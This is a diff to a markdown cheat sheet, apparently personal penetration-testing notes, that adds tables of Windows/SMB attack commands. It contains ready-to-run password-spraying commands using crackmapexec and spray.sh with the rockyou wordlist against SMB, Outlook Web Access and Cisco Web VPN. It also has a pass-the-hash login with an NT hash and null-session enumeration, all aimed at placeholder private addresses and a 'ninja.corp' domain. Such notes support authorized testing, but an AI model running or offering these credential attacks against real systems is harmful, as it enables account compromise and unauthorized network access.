@@ -63,10 +63,23 @@
 
 
 
+|  password spray   |
+| ------------- |
+| crackmapexec smb 192.168.1.1  -d ninja.corp -u MeME -P /usr/share/wordlists/rockyou.txt|
+| smbclient -N -L \\\\10.10.10.103 |
+
+
+
 | Linxu and Microsoft RPC Enumeration  |
 | ------------- |
 | smbclient -N -L \\\\10.10.10.103 | grep Disk | sed 's/^\s*\(.*\)\s*Disk.*/\1/' |
-| smbclient -N -L \\\\10.10.10.103 |
+| crackmapexec smb 192.168.1.1 -u MeMe -H NTHASH |
+|crackmapexec smb 192.168.1.1 -u '' -p '' #NULL Sessions|
+|spray.sh -smb 192.168.1.1 users.txt /usr/share/wordlists/rockyou.txt  1 35 ninja.corp|
+|spray.sh -owa 192.168.1.1 users.txt  /usr/share/wordlists/rockyou.txt   1 35 Request.body #OWA|
+|spray.sh -ciso 192.168.1.1 usernames.txt /usr/share/wordlists/rockyou.txt 1 35 #CISCO Web VPN|
+
+
 
 ### Active Directory Enumeration 
 
